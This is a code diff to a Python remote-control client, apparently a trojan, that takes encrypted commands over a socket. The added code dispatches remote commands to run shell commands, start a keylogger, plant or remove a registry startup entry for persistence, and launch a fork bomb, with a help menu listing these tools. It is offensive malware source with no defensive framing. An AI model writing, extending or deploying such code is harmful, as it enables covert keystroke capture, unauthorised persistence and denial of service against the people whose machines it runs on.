@@ -4,22 +4,66 @@ import _thread as thread
 import settings.keys as keys
 import tools.cipher as cipher
 import queue
+import tools.regedit as regedit
+import tools.forkbomb as forkbomb
 
 global stop, command_list, send_list
 command_list = queue.Queue()
 send_list = queue.Queue()
 stop = False
 
+def exe_tool(sock, cipherClass, command):
+    command = command.split(" ", 1)
+    command[0] = command[0].lower()
+
+    if command[0] == "keylogger":
+        keylogger.keylogger("data.txt")
+        send_list.put(cipherClass.encrypt("Keylogger Activated".encode()))
+        return
+    elif command[0] == "placestartup":
+        if regedit.placeStartup():
+            send_list.put(cipherClass.encrypt("OK".encode()))
+        else:
+            send_list.put(cipherClass.encrypt("ERROR placing startup".encode()))
+        return
+    elif command[0] == "removestartup":
+        if regedit.removeStartup():
+            send_list.put(cipherClass.encrypt("OK".encode()))
+        else:
+            send_list.put(cipherClass.encrypt("ERROR removing startup".encode()))
+    elif command[0] == "forkbomb":
+        send_list.put(cipherClass.encrypt("Forkbomb started...".encode()))
+        forkbomb.bomb()
+
+
+
 def parse_command(sock, cipherClass, command):
     command = command.split(" ", 1)
+    command[0] = command[0].upper()
 
     if command[0] == "CMD":
         try:
             command_list.put(command[1])
         except:
             send_list.put(cipherClass.encrypt("Error received with the command".encode()))
+    elif command[0] == "EXE":
+        if len(command[1]) <= 0:
+            send_list.put(cipherClass.encrypt("Error received with the command".encode()))
+        else:
+            exe_tool(sock, cipherClass, command[1])
+    elif command[0] == "HLP":
+        help = """
+Current list of commands implemented:
+    CMD :param:     - enter command line commands
+    EXE :param:     - execute created tools
+        param lists - keylogger
+                    - placestartup
+                    - removestartup
+                    - forkbomb
+        """
+        send_list.put(cipherClass.encrypt(help.encode()))
     else:
-        send_list.put(cipherClass.encrypt("Unknown command".encode()))
+        send_list.put(cipherClass.encrypt("Unknown command type HLP to get Help".encode()))
     return
 
 def send_message(sock):
